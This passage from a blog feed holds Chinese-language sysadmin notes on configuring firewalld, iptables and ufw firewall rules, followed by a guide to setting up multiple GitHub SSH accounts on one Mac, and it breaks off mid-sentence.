    <content type="html"><![CDATA[<span id="more"></span><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h2><h3 id="Friewalld"><a href="#Friewalld" class="headerlink" title="Friewalld"></a>Friewalld</h3><p>CentOS7默认防火墙</p><p>开启防护墙之后默认是没有任何策略的，也就是除SSH的22端口之外其他的端口都不通</p><p>防火墙策略的增加都是追加形式</p><h4 id="查询防火墙状态"><a href="#查询防火墙状态" class="headerlink" title="查询防火墙状态"></a>查询防火墙状态</h4><h5 id="firewall-cmd-–state"><a href="#firewall-cmd-–state" class="headerlink" title="firewall-cmd –state"></a>firewall-cmd –state</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--state</span><br>not running<br><br>┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--state</span><br>running<br></code></pre></td></tr></table></figure><h4 id="启动-停止防火墙"><a href="#启动-停止防火墙" class="headerlink" title="启动&#x2F;停止防火墙"></a>启动&#x2F;停止防火墙</h4><h5 id="systemctl-start-firewalld"><a href="#systemctl-start-firewalld" class="headerlink" title="systemctl start firewalld"></a>systemctl start firewalld</h5><h5 id="systemctl-stop-firewalld"><a href="#systemctl-stop-firewalld" class="headerlink" title="systemctl stop firewalld"></a>systemctl stop firewalld</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# systemctl start firewalld<br></code></pre></td></tr></table></figure><h4 id="开启-关闭开机启动"><a href="#开启-关闭开机启动" class="headerlink" title="开启&#x2F;关闭开机启动"></a>开启&#x2F;关闭开机启动</h4><h5 id="systemctl-enable-firewalld"><a href="#systemctl-enable-firewalld" class="headerlink" title="systemctl enable firewalld"></a>systemctl enable firewalld</h5><h5 id="systemctl-disable-firewalld"><a href="#systemctl-disable-firewalld" class="headerlink" title="systemctl disable firewalld"></a>systemctl disable firewalld</h5><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nsis">┌──(root㉿kali2022-appsec)-[~]<br>└─<span class="hljs-comment"># systemctl disable firewalld</span><br><br>┌──(root㉿kali2022-appsec)-[~]<br>└─<span class="hljs-comment"># systemctl enable firewalld</span><br>Created symlink /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/dbus-org.fedoraproject.FirewallD1.service → /lib/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/firewalld.service.<br>Created symlink /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/multi-<span class="hljs-literal">user</span>.target.wants/firewalld.service → /lib/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/firewalld.service.<br></code></pre></td></tr></table></figure><h4 id="加载防火墙策略"><a href="#加载防火墙策略" class="headerlink" title="加载防火墙策略"></a>加载防火墙策略</h4><p>修改防火墙规则后，需要重新加载防火墙</p><h5 id="firewall-cmd-–reload"><a href="#firewall-cmd-–reload" class="headerlink" title="firewall-cmd –reload"></a>firewall-cmd –reload</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--reload</span><br>success<br></code></pre></td></tr></table></figure><h4 id="查看防火墙开放的端口"><a href="#查看防火墙开放的端口" class="headerlink" title="查看防火墙开放的端口"></a>查看防火墙开放的端口</h4><h5 id="firewall-cmd-–list-ports"><a href="#firewall-cmd-–list-ports" class="headerlink" title="firewall-cmd –list-ports"></a>firewall-cmd –list-ports</h5><p>默认不开放任何端口</p><h4 id="查看防火墙策略"><a href="#查看防火墙策略" class="headerlink" title="查看防火墙策略"></a>查看防火墙策略</h4><h5 id="firewall-cmd-–list-all"><a href="#firewall-cmd-–list-all" class="headerlink" title="firewall-cmd –list-all"></a>firewall-cmd –list-all</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(root㉿kali2022-appsec)-[~]</span><br><span class="hljs-string">└─#</span> <span class="hljs-string">firewall-cmd</span> <span class="hljs-string">--list-all</span><br><span class="hljs-string">public</span> <span class="hljs-string">(active)</span><br>  <span class="hljs-attr">target:</span> <span class="hljs-string">default</span><br>  <span class="hljs-attr">icmp-block-inversion:</span> <span class="hljs-literal">no</span><br>  <span class="hljs-attr">interfaces:</span> <span class="hljs-string">eth0</span><br>  <span class="hljs-attr">sources:</span><br>  <span class="hljs-attr">services:</span> <span class="hljs-string">dhcpv6-client</span> <span class="hljs-string">ssh</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-attr">protocols:</span><br>  <span class="hljs-attr">forward:</span> <span class="hljs-literal">yes</span><br>  <span class="hljs-attr">masquerade:</span> <span class="hljs-literal">no</span><br>  <span class="hljs-attr">forward-ports:</span><br>  <span class="hljs-attr">source-ports:</span><br>  <span class="hljs-attr">icmp-blocks:</span><br>  <span class="hljs-attr">rich rules:</span><br>        <span class="hljs-string">rule</span> <span class="hljs-string">family=&quot;ipv4&quot;</span> <span class="hljs-string">source</span> <span class="hljs-string">address=&quot;10.222.28.166&quot;</span> <span class="hljs-string">port</span> <span class="hljs-string">port=&quot;11211&quot;</span> <span class="hljs-string">protocol=&quot;tcp&quot;</span> <span class="hljs-string">accept</span><br></code></pre></td></tr></table></figure><h4 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h4><h5 id="firewall-cmd-–zone-public-–add-port-80-tcp-–permanent"><a href="#firewall-cmd-–zone-public-–add-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –zone&#x3D;public –add-port&#x3D;80&#x2F;tcp –permanent"></a>firewall-cmd –zone&#x3D;public –add-port&#x3D;80&#x2F;tcp –permanent</h5><p>参数解读：</p><p>–zone&#x3D;public #作用域</p><p>–add-port&#x3D;80&#x2F;tcp #添加端口，格式为：端口&#x2F;通讯协议</p><p>–permanent #永久生效，没有该参数防火墙重启后失效</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">┌──(root㉿kali2022-appsec)-[~]<br>└─# firewall-cmd --zone=public --add-port=80/tcp --permanent<br><span class="hljs-keyword">success</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword"></span>┌──(root㉿kali2022-appsec)-[~]<br>└─# firewall-cmd --list-ports<br>80/tcp<br></code></pre></td></tr></table></figure><h4 id="删除端口"><a href="#删除端口" class="headerlink" title="删除端口"></a>删除端口</h4><h5 id="firewall-cmd-–zone-public-–remove-port-80-tcp-–permanent"><a href="#firewall-cmd-–zone-public-–remove-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –zone&#x3D;public –remove-port&#x3D;80&#x2F;tcp –permanent"></a>firewall-cmd –zone&#x3D;public –remove-port&#x3D;80&#x2F;tcp –permanent</h5><h4 id="查询支持的zone"><a href="#查询支持的zone" class="headerlink" title="查询支持的zone"></a>查询支持的zone</h4><p>firewall-cmd –get-zones</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kali2022-appsec)-[~]<br>└─# firewall-cmd <span class="hljs-comment">--get-zones</span><br>block dmz <span class="hljs-keyword">drop</span> <span class="hljs-keyword">external</span> home <span class="hljs-type">internal</span> nm-shared <span class="hljs-built_in">public</span> <span class="hljs-keyword">trusted</span> <span class="hljs-keyword">work</span><br></code></pre></td></tr></table></figure><h4 id="查询服务是否支持"><a href="#查询服务是否支持" class="headerlink" title="查询服务是否支持"></a>查询服务是否支持</h4><h5 id="firewall-cmd-–query-service-servicename"><a href="#firewall-cmd-–query-service-servicename" class="headerlink" title="firewall-cmd –query-service servicename"></a>firewall-cmd –query-service servicename</h5><p>firewall-cmd –query-service ftp</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--query-service</span> ftp<br>no<br><br>┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--query-service</span> ssh<br>yes<br></code></pre></td></tr></table></figure><h4 id="临时开启服务"><a href="#临时开启服务" class="headerlink" title="临时开启服务"></a>临时开启服务</h4><p>firewall-cmd –add-service&#x3D;serviceName</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@localhost tmp]# firewall-cmd --query-service ftp<br>no<br>[root@localhost tmp]# firewall-cmd --add-service=ftp<br><span class="hljs-keyword">success</span><br><span class="hljs-keyword"></span>[root@localhost tmp]# firewall-cmd --query-service ftp<br>yes<br></code></pre></td></tr></table></figure><h4 id="永久开启服务"><a href="#永久开启服务" class="headerlink" title="永久开启服务"></a>永久开启服务</h4><h5 id="firewall-cmd-–add-service-servicename-–permanent"><a href="#firewall-cmd-–add-service-servicename-–permanent" class="headerlink" title="firewall-cmd –add-service&#x3D;servicename –permanent"></a><strong>firewall-cmd –add-service&#x3D;servicename –permanent</strong></h5><p>firewall-cmd –add-service&#x3D;ftp –permanent     ##永久开放ftp服务</p><h4 id="永久添加端口"><a href="#永久添加端口" class="headerlink" title="永久添加端口"></a>永久添加端口</h4><h5 id="firewall-cmd-–add-port-80-tcp-–permanent"><a href="#firewall-cmd-–add-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –add-port&#x3D;80&#x2F;tcp –permanent"></a><strong>firewall-cmd –add-port&#x3D;80&#x2F;tcp –permanent</strong></h5><h4 id="查看防火墙规则"><a href="#查看防火墙规则" class="headerlink" title="查看防火墙规则"></a>查看防火墙规则</h4><h5 id="iptables-nL"><a href="#iptables-nL" class="headerlink" title="iptables -nL"></a>iptables -nL</h5><h4 id="清除防火墙规则"><a href="#清除防火墙规则" class="headerlink" title="清除防火墙规则"></a>清除防火墙规则</h4><h5 id="iptables-F"><a href="#iptables-F" class="headerlink" title="iptables -F"></a>iptables -F</h5><h4 id="删除防火墙策略"><a href="#删除防火墙策略" class="headerlink" title="删除防火墙策略"></a>删除防火墙策略</h4><p>–remove-rich-rule 参数</p><p>firewall-cmd –permanent –remove-rich-rule&#x3D;”rule family&#x3D;”ipv4” port protocol&#x3D;”tcp” port&#x3D;”3306” reject”</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) [root@nvm-17fuhy3puyhy0 /]# firewall-cmd --permanent <span class="hljs-attribute">--remove-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot;<span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;3306&quot;</span> reject<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h4 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h4><h5 id="firewall-cmd-–version（必须在防火墙启动的情况下才有结果）"><a href="#firewall-cmd-–version（必须在防火墙启动的情况下才有结果）" class="headerlink" title="firewall-cmd –version（必须在防火墙启动的情况下才有结果）"></a><strong>firewall-cmd –version</strong>（必须在防火墙启动的情况下才有结果）</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--version</span><br><span class="hljs-number">1.1</span><span class="hljs-selector-class">.1</span><br></code></pre></td></tr></table></figure><h4 id="防火墙策略文件位置"><a href="#防火墙策略文件位置" class="headerlink" title="防火墙策略文件位置"></a>防火墙策略文件位置</h4><h5 id="etc-firewalld-zones"><a href="#etc-firewalld-zones" class="headerlink" title="&#x2F;etc&#x2F;firewalld&#x2F;zones"></a><strong>&#x2F;etc&#x2F;firewalld&#x2F;zones</strong></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml">(base) [root@110 ~]# cat /etc/firewalld/zones/public.xml<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">zone</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">short</span>&gt;</span>Public<span class="hljs-tag">&lt;/<span class="hljs-name">short</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>For use in public areas. You do not trust the other computers on networks to not harm your computer. Only selected incoming connections are accepted.<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ssh&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dhcpv6-client&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rule</span> <span class="hljs-attr">family</span>=<span class="hljs-string">&quot;ipv4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">address</span>=<span class="hljs-string">&quot;0.0.0.0/0&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">port</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;21&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">reject</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rule</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">zone</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="设置IP和端口策略"><a href="#设置IP和端口策略" class="headerlink" title="设置IP和端口策略"></a>设置IP和端口策略</h4><h5 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”172.26.208.22” port protocol&#x3D;”tcp” port&#x3D;”11” reject”</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kali2022-appsec)-[~]<br>└─# firewall-cmd --permanent <span class="hljs-attribute">--add-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot; source <span class="hljs-attribute">address</span>=<span class="hljs-string">&quot;172.26.208.22&quot;</span><span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;11&quot;</span> reject<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h5 id="允许"><a href="#允许" class="headerlink" title="允许"></a>允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”10.222.28.0&#x2F;24” port protocol&#x3D;”tcp” port&#x3D;”5601” accept”</p><p>sudo firewall-cmd –zone&#x3D;public –add-rich-rule&#x3D;’rule family&#x3D;”ipv4” source address&#x3D;”1.1.1.1” port protocol&#x3D;”tcp” port&#x3D;”3306” accept’</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kali2022-appsec)-[~]<br>└─# firewall-cmd --permanent <span class="hljs-attribute">--add-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot; source <span class="hljs-attribute">address</span>=<span class="hljs-string">&quot;10.222.28.0/24&quot;</span><span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;3390&quot;</span> accept<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h5 id="网段允许"><a href="#网段允许" class="headerlink" title="网段允许"></a>网段允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”10.222.28.0&#x2F;24” port protocol&#x3D;”tcp” port&#x3D;”80” accept”</p><h5 id="端口段允许"><a href="#端口段允许" class="headerlink" title="端口段允许"></a>端口段允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” port protocol&#x3D;”tcp” port&#x3D;”50000-60000” accept”</p><h3 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h3><h4 id="安装防火墙"><a href="#安装防火墙" class="headerlink" title="安装防火墙"></a>安装防火墙</h4><p>yum -y install iptables-services</p><h5 id="增加规则"><a href="#增加规则" class="headerlink" title="增加规则"></a>增加规则</h5><p>如果要修改防火墙配置，如增加防火墙端口3306</p><p>vim &#x2F;etc&#x2F;sysconfig&#x2F;iptables </p><p>-A INPUT -m state –state NEW -m tcp -p tcp –dport 3306 -j ACCEPT</p><p>保存退出后</p><p>systemctl restart iptables.service #重启防火墙使配置生效</p><p>systemctl enable iptables.service #设置防火墙开机启动</p><p>最后重启系统使设置生效即可。</p><p>增加防火墙</p><p>[root@localhost opt]# iptables -A INPUT -p tcp –dport 80 -j ACCEPT<br>[root@localhost opt]# service iptables status<br>Table: filter<br>Chain INPUT (policy ACCEPT)<br>num  target     prot opt source               destination<br>1    ACCEPT     tcp  –  0.0.0.0&#x2F;0            0.0.0.0&#x2F;0           tcp dpt:80 </p><p>Chain FORWARD (policy ACCEPT)<br>num  target     prot opt source               destination         </p><p>Chain OUTPUT (policy ACCEPT)<br>num  target     prot opt source               destination         </p><p>删除防火墙</p><p>iptables -D INPUT [NUM]</p><p>允许IP段</p><p>iptables -A INPUT -s 10.222.28.0&#x2F;24 -p tcp –dport 3390 -j ACCEPT</p><p>iptables -I INPUT -s 172.16.153.57 -p tcp –dport 80 -j ACCEPT</p><p>172.16.234.56</p><p>iptables -A INPUT -p tcp –dport 8080 -j DROP</p><p>1.开放80，22，8080 端口</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 80 -j ACCEPT</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 22 -j ACCEPT</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 8080 -j ACCEPT</p><p>2.保存</p><p>&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;iptables save</p><p>3.查看打开的端口</p><p>&#x2F;etc&#x2F;init.d&#x2F;iptables status</p><p>4.关闭防火墙 </p><p>1） 永久性生效，重启后不会复原</p><p>开启： chkconfig iptables on</p><p>关闭： chkconfig iptables off</p><p>2） 即时生效，重启后复原</p><p>开启： service iptables start</p><p>关闭： service iptables stop</p><h2 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h2><h3 id="安装-ufw"><a href="#安装-ufw" class="headerlink" title="安装 ufw"></a>安装 ufw</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> ufw<br></code></pre></td></tr></table></figure><h3 id="查看防火墙状态-ufw-status"><a href="#查看防火墙状态-ufw-status" class="headerlink" title="查看防火墙状态 ufw status"></a>查看防火墙状态 ufw status</h3><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>阻止的策略优先于允许的策略</p><p><a href="https://blog.csdn.net/lql971203/article/details/84450960">https://blog.csdn.net/lql971203/article/details/84450960</a></p><p><a href="https://blog.csdn.net/lql971203/article/details/84451028">https://blog.csdn.net/lql971203/article/details/84451028</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>firewalld</tag>
      
      <tag>iptables</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_tips</title>
    <link href="/2024/03/15/yunwei/applications/git/git_tips/"/>
    <url>/2024/03/15/yunwei/applications/git/git_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="配置多个账号"><a href="#配置多个账号" class="headerlink" title="配置多个账号"></a>配置多个账号</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>mac 电脑配置多个github账号 ssh</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><h3 id="生成不同账号密钥"><a href="#生成不同账号密钥" class="headerlink" title="生成不同账号密钥"></a>生成不同账号密钥</h3><p>ssh-keygen -t rsa -C “github登录邮箱” -f ~&#x2F;.ssh&#x2F;id_rsa_密钥名称，生成不同账号的密钥，只需要修改 “github登录邮箱”和“密钥名称”即可</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">ssh-keygen -t rsa -C <span class="hljs-string">&quot;pr0t0n119@proton.me&quot;</span> -f ~<span class="hljs-regexp">/.ssh/id</span>_rsa_moss119<br></code></pre></td></tr></table></figure><p>会生成私钥 id_rsa_密钥名称、公钥 id_rsa_密钥名称_pub</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">➜  .ssh ssh-keygen -t rsa -C <span class="hljs-string">&quot;pr0t0n119@proton.me&quot;</span> -f ~/.ssh/id_rsa_moss119<br>Generating public/private rsa key pair.<br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /Users/admin/.ssh/id_rsa_moss119<br>Your public key has been saved in /Users/admin/.ssh/id_rsa_moss119.pub<br>The key fingerprint is:<br>SHA256:OgJRf1mQeTWUV+aBbqmaEHcX++qtnONdan/JBzzrIeg pr0t0n119<span class="hljs-meta">@proton.me</span><br>The key&#x27;s randomart image is:<br>+---[RSA 3072]----+<br>|<span class="hljs-string">    .   .+.o+..oo</span>|<br>|<span class="hljs-string">   . .  oo. .+.o.</span>|<br>|<span class="hljs-string">  .   . o.  ..+ .</span>|<br>|<span class="hljs-string">   .   o . . *   </span>|<br>|<span class="hljs-string">  .     S . +..  </span>|<br>|<span class="hljs-string">   .   o   o  +. </span>|<br>|<span class="hljs-string">    . o . + . ++o</span>|<br>|<span class="hljs-string">     . . +  .+*=+</span>|<br>|<span class="hljs-string">          E oO=++</span>|<br>+----[SHA256]-----+<br></code></pre></td></tr></table></figure><h3 id="公钥写入对应GitHub"><a href="#公钥写入对应GitHub" class="headerlink" title="公钥写入对应GitHub"></a>公钥写入对应GitHub</h3><p>配置链接，账号settings-&gt;SSH and GPG keys-&gt;SSH keys-&gt;New SSH Key</p><p><a href="https://github.com/settings/keys">https://github.com/settings/keys</a></p><p>title：可以随意填写</p><p>Key type：默认 Authentication Key</p><p>Key：公钥 id_rsa_密钥名称_pub的内容</p><h3 id="配置-ssh-config-文件"><a href="#配置-ssh-config-文件" class="headerlink" title="配置 ssh config 文件"></a>配置 ssh config 文件</h3><h4 id="文件位置"><a href="#文件位置" class="headerlink" title="文件位置"></a>文件位置</h4><p>~&#x2F;.ssh&#x2F;config</p><h4 id="配置文件添加内容"><a href="#配置文件添加内容" class="headerlink" title="配置文件添加内容"></a>配置文件添加内容</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Host moss119github.com<br>  HostName github.com<br>  <span class="hljs-keyword">User</span> <span class="hljs-title">git</span><br>  IdentityFile ~/.ssh/id_rsa_moss119<br>  PreferredAuthentications publickey<br></code></pre></td></tr></table></figure><p>Host：HostName 的别名</p><p>HostName：GitHub 的主机名为 “github.com”</p><p>User：设置为 “git”，是 GitHub 上 SSH 连接的默认用户名</p><p>IdentityFile： 指定 GitHub 身份验证密钥文件的路径。如果 GitHub 密钥不是默认的 <code>~/.ssh/id_rsa</code>，则需要指定正确的路径。例如，密钥文件名为 <code>id_rsa_moss119</code>，则将其路径设置为 <code>~/.ssh/id_rsa_moss119</code>。</p><h3 id="验证SSH登录"><a href="#验证SSH登录" class="headerlink" title="验证SSH登录"></a>验证SSH登录</h3><p>ssh -T 别名</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  moss119<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span> git:(main) ssh -T moss119github<span class="hljs-selector-class">.com</span><br>Hi moss119! You<span class="hljs-string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></code></pre></td></tr></table></figure><h2 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h2><h3 id="Permission-denied"><a href="#Permission-denied" class="headerlink" title="Permission denied"></a>Permission denied</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  moss119<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span> git:(main) ssh -T moss119github<span class="hljs-selector-class">.com</span>     <br>admin@github<span class="hljs-selector-class">.com</span>: Permission denied (publickey).<br></code></pre></td></tr></table></figure><p>ssh config 没有设置用户名且命令中没有指定用户，会使用当前设备登录的用户名进行登录验证，肯定会报错</p><p>解决方案</p><p>ssh config 中设置用户：User git</p><p>或</p><p>命令中指定用户 ：<a href="mailto:&#x67;&#105;&#x74;&#x40;&#109;&#111;&#115;&#115;&#49;&#49;&#x39;&#103;&#x69;&#x74;&#104;&#x75;&#x62;&#46;&#x63;&#111;&#x6d;">&#x67;&#105;&#x74;&#x40;&#109;&#111;&#115;&#115;&#49;&#49;&#x39;&#103;&#x69;&#x74;&#104;&#x75;&#x62;&#46;&#x63;&#111;&#x6d;</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.quafoo.net/posts/Add-Multi-Github-Account-On-Same-Mac/">https://www.quafoo.net/posts/Add-Multi-Github-Account-On-Same-Mac/</a></p><h1 id="SSH拉取代码"><a href="#SSH拉取代码" class="headerlink" title="SSH拉取代码"></a>SSH拉取代码</h1><ol><li><p>在本地生成 SSH key，命令为 <code>ssh-keygen -t rsa -C &quot;xxxxx@xxxxx.com&quot;</code>，这里的 <code>xxxxx@xxxxx.com</code> 是你的邮箱地址，并不要求与特定的邮箱地址匹配。</p></li><li><p>把公钥放到 GitHub 上。在本地找到 id_rsa.pub 文件，复制里面的内容。然后回到 GitHub，进入自己的设置（Settings）页面，在 “SSH and GPG keys” 下点击 “New SSH key”，在 Key 框里粘贴刚才复制的公钥内容，然后点击 “Add key”。</p></li><li><p>测试代码是否推拉正常。在本地找个文件夹打开 Git Bash，输入 <code>git clone 